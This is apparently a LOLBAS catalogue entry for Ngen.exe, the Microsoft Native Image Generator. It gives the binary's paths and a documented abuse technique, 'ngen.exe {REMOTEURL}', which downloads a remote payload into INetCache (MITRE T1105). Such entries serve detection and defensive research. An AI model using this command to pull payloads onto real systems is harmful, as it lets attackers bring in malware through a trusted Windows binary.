---
Acknowledgement:
- Person: Avihay El
Author: Avihay Eldad
Commands:
- Category: Download
  Command: ngen.exe {REMOTEURL}
  Description: Downloads payload from remote server using the Microsoft Native Image
    Generator utility.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2024-02-19
Description: Microsoft Native Image Generator.
Full_Path:
- Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ngen.exe
- Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe
Name: Ngen.exe
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/osbinaries
---

# Ngen.exe

Microsoft Native Image Generator.

# Path(s)

- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ngen.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe`

# Download Commands

Downloads payload from remote server using the Microsoft Native Image Generator utility.

```batch
ngen.exe {REMOTEURL}
```

- **Usecase:** It will download a remote payload and place it in INetCache.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11


# Acknowledgements

- Avihay Eldad (Authored, 2024-02-19)
- Avihay El